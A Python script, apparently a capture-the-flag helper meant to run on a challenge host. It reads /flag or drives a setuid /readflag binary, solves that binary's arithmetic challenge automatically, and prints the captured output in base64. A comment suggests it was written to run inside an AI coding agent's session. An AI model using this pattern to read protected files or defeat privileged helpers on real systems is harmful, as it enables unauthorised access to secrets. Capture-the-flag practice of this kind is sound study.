#!/usr/bin/env python3
import base64
import os
import re
import subprocess
import sys


EXPR_RE = re.compile(r"^\([0-9+\-()]+\)$")
BRACE_TOKEN_RE = re.compile(r"([A-Za-z0-9_]{2,32}\{[^\n\r]{1,200}\})")


def _safe_eval(expr: str) -> int:
    expr = expr.strip()
    if not EXPR_RE.fullmatch(expr):
        raise ValueError(f"unexpected expression: {expr!r}")
    return int(eval(expr, {"__builtins__": {}}, {}))


def _result(s: str) -> None:
    # One short line to survive Codex truncation.
    sys.stdout.write("RESULT: " + s.strip().replace("\n", " ") + "\n")

def _result_b64(data: bytes) -> None:
    b64 = base64.b64encode(data).decode("ascii")
    sys.stdout.write("RESULT_B64: " + b64 + "\n")


def try_read_flag_file() -> str | None:
    try:
        data = open("/flag", "rb").read()
    except Exception as e:
        return f"/flag read error: {type(e).__name__}: {e}"

    if not data:
        return "/flag is empty"
    _result_b64(data)
    return None


def run_readflag_and_extract() -> str | None:
    p = subprocess.Popen(
        ["/readflag"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
    )
    if p.stdin is None or p.stdout is None:
        return "spawn error"

    buf = ""
    while True:
        ch = p.stdout.read(1)
        if ch == "":
            break
        buf += ch
        if "input your answer:" in buf:
            break

    m = re.search(r"\n(\([0-9+\-()]+\))\s*\ninput your answer:", buf)
    if not m:
        return "protocol error (no expr)"

    ans = _safe_eval(m.group(1))
    p.stdin.write(str(ans) + "\n")
    p.stdin.flush()

    out = buf + p.stdout.read()
    # If /readflag printed the flag contents, capture it verbatim.
    _result_b64(out.encode("utf-8", errors="replace"))
    return None


def main() -> int:
    # First try direct read.
    direct = try_read_flag_file()
    if direct is None:
        return 0

    # Then try setuid helper.
    via = run_readflag_and_extract()
    if via is None:
        return 0

    # Debug info if neither worked.
    _result(f"{direct}; {via}; euid={os.geteuid()} uid={os.getuid()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
